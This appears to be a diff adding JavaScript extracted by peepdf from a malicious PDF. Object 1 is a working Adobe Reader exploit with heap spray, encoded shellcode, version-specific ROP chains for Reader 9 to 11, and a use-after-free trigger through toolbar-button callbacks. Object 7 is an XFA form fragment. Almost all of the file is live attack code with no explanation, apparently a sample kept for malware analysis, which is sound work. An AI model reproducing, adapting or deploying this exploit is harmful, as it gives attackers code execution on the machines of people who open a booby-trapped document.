@@ -1,0 +1,118 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+{
+    var x = this.mouseX;
+    var y = this.mouseY;
+    while (x == this.mouseX || y == this.mouseY); {
+
+        // comment
+
+
+        function heapSpray(str, str_addr, r_addr) {
+            var aaa = unescape("%u0c0c");
+            aaa += aaa;
+            while ((aaa.length + 24 + 4) < (0x8000 + 0x8000)) aaa += aaa;
+            var i1 = r_addr - 0x24;
+            var bbb = aaa.substring(0, i1 / 2);
+            var sa = str_addr;
+            while (sa.length < (0x0c0c - r_addr)) sa += sa;
+            bbb += sa;
+            bbb += aaa;
+            var i11 = 0x0c0c - 0x24;
+            bbb = bbb.substring(0, i11 / 2);
+            bbb += str;
+            bbb += aaa;
+            var i2 = 0x4000 + 0xc000;
+            var ccc = bbb.substring(0, i2 / 2);
+            while (ccc.length < (0x40000 + 0x40000)) ccc += ccc;
+            var i3 = (0x1020 - 0x08) / 2;
+            var ddd = ccc.substring(0, 0x80000 - i3);
+            var eee = new Array();
+            for (i = 0; i < 0x1e0 + 0x10; i++) eee[i] = ddd + "s";
+            return;
+        }
+
+        var shellcode = unescape("%u36ba%ubbc3%ud919%ud9ca%u2474%u5ef4%uc929%u3bb1%u5631%u0314%u1456%uee83%ud4fc%u4736%u9af1%ub8b9%ufa02%u5d30%u3a33%u1526%u8a64%u7b2c%u6189%u6860%u071a%u9fad%uadab%uae8b%u9d2c%ub1e8%udfae%u123c%u108e%u5331%u4cd7%u01b8%u1b80%ub66f%u51a5%u3dac%u74f5%ua2b4%u774e%u7495%u2ec4%u7635%u5b09%u607c%u614e%u1b36%u1ea4%ucdc9%udff4%u3066%u1239%u7476%uccfe%u8c0d%u71fc%u4b16%uad7e%u4893%u26d8%ub503%uebd8%u3ed2%u40d6%u1990%u57fb%u1275%udc07%uf578%ua681%ud15e%u7dca%u40fe%ud0b7%u93ff%u8d18%ud8a5%udab5%u82d7%u1dd3%ub965%u1d96%uc275%u7586%u4944%u0249%u9859%ufc2d%u8113%u9404%u53fd%uf915%u89fd%u075a%u387e%ufc23%u499e%ub926%ua118%ud25a%uc5cc%ud3c9%ub6c4%u5c82%u4482%uca2e%uc529%u24bc%u6dd7%u1858%ueb44%u75d6%u9c29%uf178%u0cc8%ud9f1%u9436%u6f97%u420d%udf25%u192d%uadd6%uada4%u7f6c%u3643%u5ff9%uafe3%u4101");
+        var executable = "";
+        var rop9 = unescape("%u313d%u4a82%ua713%u4a82%u1f90%u4a80%u9038%u4a84%u7e7d%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u155a%u4a80%u3a84%u4a84%ud4de%u4a82%u1f90%u4a80%u76aa%u4a84%u9030%u4a84%u4122%u4a84%u76aa%u4a84%u7e7d%u4a80%u3178%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u3a82%u4a84%u6c5e%u4a84%u76ab%u4a84%u6395%u7ffe%u0400%u0000%ua044%ua827%u7984%u4a81%u3178%u4a81");
+        var rop10 = unescape("%u6015%u4a82%ue090%u4a82%u007d%u4a82%u0038%u4a85%u46d5%u4a82%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u5016%u4a80%u420c%u4a84%u4241%u4a81%u007d%u4a82%u6015%u4a82%u0030%u4a85%ub49d%u4a84%u6015%u4a82%u46d5%u4a82%u4197%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u4013%u4a81%ue036%u4a84%ua8df%u4a82%u25f0%u252a%u0400%u0000%u0bc8%ueffb%u8b31%u4a81%u4197%u4a81");
+        var rop11 = unescape("%u822c%u4a85%uf129%u4a82%u597f%u4a85%u6038%u4a86%uf1d5%u4a83%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u5093%u4a85%uac4d%u1be9%u0030%u4a85%u597f%u4a85%u0031%u4a85%uca07%uc4f3%u822c%u4a85%uf1d5%u4a83%ud4f8%u4a85%u6030%u4a86%u4864%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u4856%u4a81%u05a0%u4a85%u0bc4%u4a86%u05a0%u4a85%uc376%u4a81%u63d0%u4a84%u0400%u0000%ud4f8%u4a85%ud4f8%u4a85%u4864%u4a81");
+        var r11 = false;
+        var vulnerable = true;
+
+        var obj_size;
+        var rop;
+        var ret_addr;
+        var rop_addr;
+        var r_addr;
+
+        if (app.viewerVersion >= 9 && app.viewerVersion < 10 && app.viewerVersion <= 9.504) {
+            obj_size = 0x330 + 0x1c;
+            rop = rop9;
+            ret_addr = unescape("%ua83e%u4a82");
+            rop_addr = unescape("%u08e8%u0c0c");
+            r_addr = 0x08e8;
+        } else if (app.viewerVersion >= 10 && app.viewerVersion < 11 && app.viewerVersion <= 10.106) {
+            obj_size = 0x360 + 0x1c;
+            rop = rop10;
+            rop_addr = unescape("%u08e4%u0c0c");
+            r_addr = 0x08e4;
+            ret_addr = unescape("%ua8df%u4a82");
+        } else if (app.viewerVersion >= 11 && app.viewerVersion <= 11.002) {
+            r11 = true;
+            obj_size = 0x370;
+            rop = rop11;
+            rop_addr = unescape("%u08a8%u0c0c");
+            r_addr = 0x08a8;
+            ret_addr = unescape("%u8003%u4a84");
+        } else {
+            vulnerable = false;
+        }
+
+        if (vulnerable) {
+            var payload = rop + shellcode;
+            heapSpray(payload, ret_addr, r_addr);
+
+            var part1 = "";
+            if (!r11) {
+                for (i = 0; i < 0x1c / 2; i++) part1 += unescape("%u4141");
+            }
+            part1 += rop_addr;
+            var part2 = "";
+            var part2_len = obj_size - part1.length * 2;
+            for (i = 0; i < part2_len / 2 - 1; i++) part2 += unescape("%u4141");
+            var arr = new Array();
+
+            removeButtonFunc = function() {
+                app.removeToolButton({
+                    cName: "evil"
+                });
+
+                for (i = 0; i < 10; i++) arr[i] = part1.concat(part2);
+            }
+
+            addButtonFunc = function() {
+                app.addToolButton({
+                    cName: "xxx",
+                    cExec: "1",
+                    cEnable: "removeButtonFunc();"
+                });
+            }
+
+            app.addToolButton({
+                cName: "evil",
+                cExec: "1",
+                cEnable: "addButtonFunc();"
+            });
+
+        }
+    }
+}
+
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
